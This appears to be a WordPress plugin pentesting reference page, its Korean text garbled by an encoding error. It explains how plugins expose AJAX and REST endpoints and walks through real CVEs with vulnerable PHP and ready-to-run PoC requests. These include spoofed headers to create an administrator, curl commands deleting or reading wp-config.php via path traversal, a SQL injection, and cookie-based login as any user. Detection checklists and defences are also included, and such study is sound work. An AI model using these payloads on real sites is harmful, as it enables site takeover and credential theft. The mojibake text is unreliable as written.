Wordpress í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ì–´ë–»ê²Œ ë…¸ì¶œí•˜ëŠ”ì§€ ì•„ëŠ” ê²ƒì€ í•´ë‹¹ ê¸°ëŠ¥ì˜ ì·¨ì•½ì ì„ ì°¾ëŠ” ë° í•µì‹¬ì…ë‹ˆë‹¤. ë‹¤ìŒ ëª©ë¡ì—ì„œ í”ŒëŸ¬ê·¸ì¸ì´ ê¸°ëŠ¥ì„ ë…¸ì¶œí•  ìˆ˜ ìˆëŠ” ë°©ë²•ê³¼ ì·¨ì•½í•œ í”ŒëŸ¬ê·¸ì¸ì˜ ëª‡ ê°€ì§€ ì˜ˆë¥¼ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **`wp_ajax`**

í”ŒëŸ¬ê·¸ì¸ì´ ì‚¬ìš©ìì—ê²Œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” AJAX handlersë¥¼ í†µí•œ ê²ƒì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ê²ƒë“¤ì€ logic, authorization, ë˜ëŠ” authentication ë²„ê·¸ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì´ ì¸ì¦ê³¼ ê¶Œí•œì„ ëª¨ë‘ Wordpress nonceì˜ ì¡´ì¬ ì—¬ë¶€ì— ê¸°ë°˜í•˜ëŠ” ê²½ìš°ê°€ ê½¤ ìì£¼ ìˆìœ¼ë©°, ì´ëŠ” **Wordpress ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ì¸ì¦ëœ ëª¨ë“  ì‚¬ìš©ìê°€ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤**(ì—­í• ê³¼ ë¬´ê´€í•˜ê²Œ).

ë‹¤ìŒì€ í”ŒëŸ¬ê·¸ì¸ì—ì„œ í•¨ìˆ˜ë¥¼ ë…¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆëŠ” í•¨ìˆ˜ë“¤ì…ë‹ˆë‹¤:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`ì˜ ì‚¬ìš©ì€ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ëª¨ë“  ì‚¬ìš©ì(ì‹¬ì§€ì–´ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ì)ë„ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë§Œë“­ë‹ˆë‹¤.**

> [!CAUTION]
> ë˜í•œ, ë§Œì•½ í•¨ìˆ˜ê°€ ë‹¨ì§€ `wp_verify_nonce` í•¨ìˆ˜ë¡œ ì‚¬ìš©ìì˜ ê¶Œí•œì„ í™•ì¸í•˜ê³  ìˆë‹¤ë©´, ì´ í•¨ìˆ˜ëŠ” ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í–ˆëŠ”ì§€ë§Œ í™•ì¸í•  ë¿ ë³´í†µ ì‚¬ìš©ìì˜ ì—­í• (role)ì€ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ê¶Œí•œì´ ë‚®ì€ ì‚¬ìš©ìê°€ ê¶Œí•œì´ ë†’ì€ ì‘ì—…ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **REST API**

ë˜í•œ `register_rest_route` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ wordpressì—ì„œ í•¨ìˆ˜ë¥¼ REST APIë¡œ ë“±ë¡í•˜ì—¬ ë…¸ì¶œì‹œí‚¤ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback`ì€ í•´ë‹¹ ì‚¬ìš©ìê°€ API ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ê¶Œí•œì´ ìˆëŠ”ì§€ ê²€ì‚¬í•˜ëŠ” ì½œë°± í•¨ìˆ˜ì…ë‹ˆë‹¤.

**ë‚´ì¥ `__return_true` í•¨ìˆ˜ê°€ ì‚¬ìš©ë˜ë©´ ì‚¬ìš©ì ê¶Œí•œ ê²€ì‚¬ë¥¼ ê±´ë„ˆëœë‹ˆë‹¤.**

- **php íŒŒì¼ì— ëŒ€í•œ ì§ì ‘ ì ‘ê·¼**

ë¬¼ë¡ , WordpressëŠ” PHPë¥¼ ì‚¬ìš©í•˜ë©° í”ŒëŸ¬ê·¸ì¸ ë‚´ë¶€ì˜ íŒŒì¼ì€ ì›¹ì—ì„œ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ í”ŒëŸ¬ê·¸ì¸ì´ íŒŒì¼ì— ì ‘ê·¼í•˜ê¸°ë§Œ í•´ë„ íŠ¸ë¦¬ê±°ë˜ëŠ” ì·¨ì•½í•œ ê¸°ëŠ¥ì„ ë…¸ì¶œí•˜ê³  ìˆë‹¤ë©´, ëª¨ë“  ì‚¬ìš©ìê°€ ì´ë¥¼ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ì¼ë¶€ í”ŒëŸ¬ê·¸ì¸ì€ â€œtrusted headerâ€ ë‹¨ì¶•ì„ ë‚´ë¶€ í†µí•©ì´ë‚˜ ë¦¬ë²„ìŠ¤ í”„ë¡ì‹œìš©ìœ¼ë¡œ êµ¬í˜„í•œ ë‹¤ìŒ, REST ìš”ì²­ì˜ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ê¸° ìœ„í•´ í•´ë‹¹ í—¤ë”ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ê·¸ í—¤ë”ê°€ ì—…ìŠ¤íŠ¸ë¦¼ ì»´í¬ë„ŒíŠ¸ì— ì˜í•´ ìš”ì²­ê³¼ ì•”í˜¸í•™ì ìœ¼ë¡œ ê²°ì†ë˜ì–´ ìˆì§€ ì•Šìœ¼ë©´, ê³µê²©ìëŠ” ì´ë¥¼ ìŠ¤í‘¸í•‘í•˜ì—¬ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ íŠ¹ê¶Œ REST ë¼ìš°íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì˜í–¥: core users REST routeë¥¼ í†µí•´ ìƒˆ ê´€ë¦¬ì ê³„ì •ì„ ìƒì„±í•˜ì—¬ ì¸ì¦ ì—†ì´ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹.
- ì˜ˆì‹œ í—¤ë”: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1ì„ ê°•ì œë¡œ ì§€ì • â€” ì¼ë°˜ì ìœ¼ë¡œ ì²« ë²ˆì§¸ ê´€ë¦¬ì ê³„ì •).
- ì•…ìš©ëœ ë¼ìš°íŠ¸: `POST /wp-json/wp/v2/users` (ê¶Œí•œì´ ìƒìŠ¹ëœ ì—­í•  ë°°ì—´ê³¼ í•¨ê»˜).

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
ì™œ ì‘ë™í•˜ëŠ”ê°€

- í”ŒëŸ¬ê·¸ì¸ì´ í´ë¼ì´ì–¸íŠ¸ê°€ ì œì–´í•˜ëŠ” í—¤ë”ë¥¼ ì¸ì¦ ìƒíƒœë¡œ ë§¤í•‘í•˜ê³  ê¶Œí•œ ê²€ì‚¬ë¥¼ ê±´ë„ˆë›´ë‹¤.
- WordPress ì½”ì–´ëŠ” ì´ ë¼ìš°íŠ¸ì— ëŒ€í•´ `create_users` ê¶Œí•œì„ ê¸°ëŒ€í•œë‹¤; í”ŒëŸ¬ê·¸ì¸ í•´í‚¹ì€ í—¤ë”ì—ì„œ ì§ì ‘ í˜„ì¬ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•´ ì´ë¥¼ ìš°íšŒí•œë‹¤.

ì˜ˆìƒ ì„±ê³µ ì§€í‘œ

- ìƒì„±ëœ ì‚¬ìš©ìë¥¼ ì„¤ëª…í•˜ëŠ” JSON ë³¸ë¬¸ê³¼ í•¨ê»˜ HTTP 201.
- `wp-admin/users.php`ì— í‘œì‹œë˜ëŠ” ìƒˆë¡œìš´ ê´€ë¦¬ì ì‚¬ìš©ì.

íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

- `getallheaders()`, `$_SERVER['HTTP_...']` ë˜ëŠ” ì‚¬ìš©ì ì •ì˜ í—¤ë”ë¥¼ ì½ì–´ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¥¼ ì„¤ì •í•˜ëŠ” vendor SDKsë¥¼ grepí•œë‹¤(ì˜ˆ: `wp_set_current_user()`, `wp_set_auth_cookie()`).
- ê²¬ê³ í•œ `permission_callback` ê²€ì‚¬ë¥¼ ê°–ì¶”ì§€ ëª»í•˜ê³  ëŒ€ì‹  ìš”ì²­ í—¤ë”ì— ì˜ì¡´í•˜ëŠ” ê¶Œí•œ ìˆëŠ” ì½œë°±ì— ëŒ€í•œ REST ë“±ë¡ì„ ê²€í† í•œë‹¤.
- REST í•¸ë“¤ëŸ¬ ë‚´ë¶€ì—ì„œ í—¤ë” ê°’ìœ¼ë¡œë§Œ ì œí•œë˜ëŠ” í•µì‹¬ ì‚¬ìš©ì ê´€ë¦¬ í•¨ìˆ˜(`wp_insert_user`, `wp_create_user`)ì˜ ì‚¬ìš©ì„ ì°¾ì•„ë¼.

### wp_ajax_noprivì„ í†µí•œ ì¸ì¦ë˜ì§€ ì•Šì€ ì„ì˜ì˜ íŒŒì¼ ì‚­ì œ (Litho Theme <= 3.0)

WordPress í…Œë§ˆì™€ í”ŒëŸ¬ê·¸ì¸ì€ ì¢…ì¢… `wp_ajax_` ë° `wp_ajax_nopriv_` í›…ì„ í†µí•´ AJAX í•¸ë“¤ëŸ¬ë¥¼ ë…¸ì¶œí•œë‹¤. **_nopriv_** ë³€í˜•ì´ ì‚¬ìš©ë  ë•Œ **ì½œë°±ì´ ì¸ì¦ë˜ì§€ ì•Šì€ ë°©ë¬¸ìì—ê²Œ ë„ë‹¬ ê°€ëŠ¥í•´ì§€ë¯€ë¡œ**, ëª¨ë“  ë¯¼ê°í•œ ë™ì‘ì€ ì¶”ê°€ë¡œ ë‹¤ìŒì„ êµ¬í˜„í•´ì•¼ í•œë‹¤:

1. **ê¶Œí•œ í™•ì¸**(ì˜ˆ: `current_user_can()` ë˜ëŠ” ìµœì†Œí•œ `is_user_logged_in()`), ê·¸ë¦¬ê³ 
2. `check_ajax_referer()` / `wp_verify_nonce()`ë¡œ ê²€ì¦ë˜ëŠ” **CSRF nonce**, ê·¸ë¦¬ê³ 
3. **ì—„ê²©í•œ ì…ë ¥ ì •ì œ / ê²€ì¦**.

Litho ë©€í‹°í¼í¬ì¦ˆ í…Œë§ˆ (< 3.1)ëŠ” *Remove Font Family* ê¸°ëŠ¥ì—ì„œ ì´ ì„¸ ê°€ì§€ ì œì–´ë¥¼ ëˆ„ë½í–ˆê³ , ê²°êµ­ ë‹¤ìŒ ì½”ë“œë¥¼ í¬í•¨í•˜ì—¬ ë°°í¬ë˜ì—ˆë‹¤(ë‹¨ìˆœí™”ë¨):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
ì´ ìŠ¤ë‹ˆí«ìœ¼ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ë¬¸ì œ:

* **Unauthenticated access** â€“ `wp_ajax_nopriv_` í›…ì´ ë“±ë¡ë˜ì–´ ìˆìŠµë‹ˆë‹¤.
* **No nonce / capability check** â€“ ëª¨ë“  ë°©ë¬¸ìê°€ í•´ë‹¹ ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **No path sanitisation** â€“ ì‚¬ìš©ì ì œì–´ `fontfamily` ë¬¸ìì—´ì´ í•„í„°ë§ ì—†ì´ íŒŒì¼ ì‹œìŠ¤í…œ ê²½ë¡œì— ì´ì–´ë¶™ì—¬ì ¸ ì „í˜•ì ì¸ `../../` traversalì„ í—ˆìš©í•©ë‹ˆë‹¤.

#### ì•…ìš©

ê³µê²©ìëŠ” ë‹¨ í•œ ë²ˆì˜ HTTP POST ìš”ì²­ìœ¼ë¡œ **uploads base directory ì•„ë˜**(ë³´í†µ `<wp-root>/wp-content/uploads/`)ì˜ ì„ì˜ íŒŒì¼ì´ë‚˜ ë””ë ‰í„°ë¦¬ë¥¼ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### íƒì§€ ì²´í¬ë¦¬ìŠ¤íŠ¸

* íŒŒì¼ ì‹œìŠ¤í…œ í—¬í¼(`copy()`, `unlink()`, `$wp_filesystem->delete()` ë“±)ë¥¼ í˜¸ì¶œí•˜ëŠ” ëª¨ë“  `add_action( 'wp_ajax_nopriv_...')` ì½œë°±.
* ê²½ë¡œì— ë¹„ê²€ì¦ ì‚¬ìš©ì ì…ë ¥ì„ ì´ì–´ë¶™ì´ëŠ” ê²½ìš°(`$_POST`, `$_GET`, `$_REQUEST`ë¥¼ í™•ì¸).
* `check_ajax_referer()` ë° `current_user_can()`/`is_user_logged_in()`ì˜ ë¶€ì¬.

---

### ì˜¤ë˜ëœ ì—­í•  ë³µì› ë° ì¸ì¦ ëˆ„ë½ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹ (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ì™œ ì·¨ì•½í•œê°€

- ì„œë²„ ì¸¡ ê¶Œí•œ ê²€ì¦ ì—†ì´ `$_REQUEST['reset-for']`ì™€ í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ì„ ì‹ ë¢°í•œë‹¤.
- ì‚¬ìš©ìê°€ ì´ì „ì— ë” ë†’ì€ ê¶Œí•œì„ `_asenha_view_admin_as_original_roles`ì— ì €ì¥í•´ ë‘ì—ˆê³  ì´í›„ ê¶Œí•œì´ ë‚®ì•„ì§„ ê²½ìš°, reset ê²½ë¡œì— ì ‘ê·¼í•´ ì´ë¥¼ ë³µì›í•  ìˆ˜ ìˆë‹¤.
- ì¼ë¶€ ë°°í¬ì—ì„œëŠ”, ì¸ì¦ëœ ì–´ë–¤ ì‚¬ìš©ìë„ `viewing_admin_as_role_are`ì— ì—¬ì „íˆ ë‚¨ì•„ ìˆëŠ” ë‹¤ë¥¸ ì‚¬ìš©ìëª…ì„ ëŒ€ìƒìœ¼ë¡œ ë¦¬ì…‹ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆë‹¤(ê¶Œí•œ ê²€ì¦ ê²°í•¨).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
On vulnerable builds this removes current roles and re-adds the saved original roles (e.g., `administrator`), effectively escalating privileges.

Detection checklist

- user metaì— 'original roles'ë¥¼ ì˜êµ¬ ì €ì¥í•˜ëŠ” ì—­í•  ì „í™˜ ê¸°ëŠ¥ì„ ì°¾ì•„ë³´ì„¸ìš”(ì˜ˆ: `_asenha_view_admin_as_original_roles`).
- ë‹¤ìŒê³¼ ê°™ì€ ë¦¬ì…‹/ë³µì› ê²½ë¡œë¥¼ ì‹ë³„í•˜ì„¸ìš”:
  - `$_REQUEST` / `$_GET` / `$_POST`ì—ì„œ ì‚¬ìš©ìëª…ì„ ì½ëŠ”ì§€.
  - `add_role()` / `remove_role()`ë¡œ ì—­í• ì„ ë³€ê²½í•˜ë©´ì„œ `current_user_can()`ì™€ `wp_verify_nonce()` / `check_admin_referer()` ì—†ì´ ë™ì‘í•˜ëŠ”ì§€.
  - í–‰ìœ„ìì˜ ê¶Œí•œ(capabilities) ëŒ€ì‹  í”ŒëŸ¬ê·¸ì¸ ì˜µì…˜ ë°°ì—´(ì˜ˆ: `viewing_admin_as_role_are`)ì— ê¸°ë°˜í•´ ê¶Œí•œì„ ë¶€ì—¬í•˜ëŠ”ì§€.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

Some plugins wire user-switching helpers to the public `init` hook and derive identity from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
ì™œ ì·¨ì•½í•œê°€

- ê³µê°œëœ `init` í›…ìœ¼ë¡œ í•¸ë“¤ëŸ¬ê°€ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìë„ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (`is_user_logged_in()` ë³´í˜¸ ì—†ìŒ).
- ì‹ ì›ì€ í´ë¼ì´ì–¸íŠ¸ì—ì„œ ìˆ˜ì • ê°€ëŠ¥í•œ ì¿ í‚¤(`original_user_id`)ë¡œë¶€í„° íŒŒìƒë©ë‹ˆë‹¤.
- `wp_set_auth_cookie($uid)`ë¥¼ ì§ì ‘ í˜¸ì¶œí•˜ë©´ ê¶Œí•œ ë˜ëŠ” nonce ê²€ì‚¬ ì—†ì´ ìš”ì²­ìë¥¼ í•´ë‹¹ ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ì‹œí‚µë‹ˆë‹¤.

Exploitation (unauthenticated)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many highâ€‘impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

ê³µê²© ë…¸íŠ¸

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

ë°©ì–´ ë…¸íŠ¸

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Also, **only install trustable WordPress plugins and themes**.

### ë³´ì•ˆ í”ŒëŸ¬ê·¸ì¸

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **ê¸°íƒ€ ê¶Œì¥ì‚¬í•­**

- ê¸°ë³¸ **admin** ì‚¬ìš©ì ì œê±°
- **ê°•ë ¥í•œ ë¹„ë°€ë²ˆí˜¸**ì™€ **2FA** ì‚¬ìš©
- ì£¼ê¸°ì ìœ¼ë¡œ ì‚¬ìš©ì **ê¶Œí•œ**ì„ **ê²€í† **í•˜ì„¸ìš”
- Brute Force ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ **ë¡œê·¸ì¸ ì‹œë„ ì œí•œ** ì ìš©
- **`wp-admin.php`** íŒŒì¼ ì´ë¦„ì„ ë³€ê²½í•˜ê³  ë‚´ë¶€ ë˜ëŠ” íŠ¹ì • IPì—ì„œë§Œ ì ‘ê·¼ í—ˆìš©


### Unauthenticated SQL Injection via insufficient validation (WP Job Portal <= 2.3.2)

The WP Job Portal recruitment plugin exposed a **savecategory** task that ultimately executes the following vulnerable code inside `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** â€“ `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** â€“ no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** â€“ although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. ìƒˆë¡œìš´ nonceë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`ë¥¼ ì•…ìš©í•´ ì„ì˜ì˜ SQLì„ ì£¼ì…í•©ë‹ˆë‹¤:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
ì‘ë‹µì€ ì£¼ì…ëœ ì¿¼ë¦¬ì˜ ê²°ê³¼ë¥¼ ë…¸ì¶œí•˜ê±°ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë³€ê²½í•˜ì—¬ SQLië¥¼ ì…ì¦í•©ë‹ˆë‹¤.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Another task, **downloadcustomfile**, allowed visitors to download **any file on disk** via path traversal.  The vulnerable sink is located in `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name`ì€ ê³µê²©ìê°€ ì œì–´í•˜ë©° **without sanitisation** ìƒíƒœë¡œ ì´ì–´ë¶™ì—¬ì§‘ë‹ˆë‹¤. ë‹¤ì‹œ ë§í•˜ë©´, ìœ ì¼í•œ ì¥ë²½ì€ ì´ë ¥ì„œ í˜ì´ì§€ì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” **CSRF nonce**ì…ë‹ˆë‹¤.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ì„œë²„ê°€ `wp-config.php`ì˜ ë‚´ìš©ì„ ë°˜í™˜í•˜ì—¬ DB credentialsì™€ auth keysë¥¼ leakí•œë‹¤.

## Unauthenticated account takeover via Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

ë§ì€ í…Œë§ˆ/í”ŒëŸ¬ê·¸ì¸ì€ admin-ajax.phpë¥¼ í†µí•´ ë…¸ì¶œë˜ëŠ” "social login" í—¬í¼ë¥¼ í¬í•¨í•œë‹¤. ì¸ì¦ë˜ì§€ ì•Šì€ AJAX ì•¡ì…˜(wp_ajax_nopriv_...)ì´ provider ë°ì´í„°ê°€ ì—†ì„ ë•Œ í´ë¼ì´ì–¸íŠ¸ê°€ ì œê³µí•œ ì‹ë³„ìë¥¼ ì‹ ë¢°í•˜ê³  wp_set_auth_cookie()ë¥¼ í˜¸ì¶œí•˜ë©´, ì´ëŠ” ì™„ì „í•œ ì¸ì¦ ìš°íšŒê°€ ëœë‹¤.

Typical flawed pattern (simplified)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
ì™œ ì·¨ì•½í•œê°€

- ì¸ì¦ ì—†ì´ admin-ajax.phpë¥¼ í†µí•´ ì ‘ê·¼ ê°€ëŠ¥ (wp_ajax_nopriv_â€¦ action).
- ìƒíƒœ ë³€ê²½ ì „ì— nonce/capability ì²´í¬ ì—†ìŒ.
- OAuth/OpenID provider ê²€ì¦ ëˆ„ë½; default branchê°€ ê³µê²©ì ì…ë ¥ì„ ìˆ˜ìš©í•¨.
- get_user_by('email', $_POST['id']) ë‹¤ìŒì— wp_set_auth_cookie($uid)ë¥¼ í˜¸ì¶œí•˜ë©´ ìš”ì²­ìë¥¼ ê¸°ì¡´ ì´ë©”ì¼ ì£¼ì†Œ ì¤‘ í•˜ë‚˜ë¡œ ì¸ì¦í•¨.

ì•…ìš© (ë¹„ì¸ì¦)

- ì „ì œì¡°ê±´: ê³µê²©ìê°€ /wp-admin/admin-ajax.phpì— ì ‘ê·¼í•  ìˆ˜ ìˆê³  ìœ íš¨í•œ ì‚¬ìš©ì ì´ë©”ì¼ì„ ì•Œê³  ìˆê±°ë‚˜ ì¶”ì¸¡í•  ìˆ˜ ìˆìŒ.
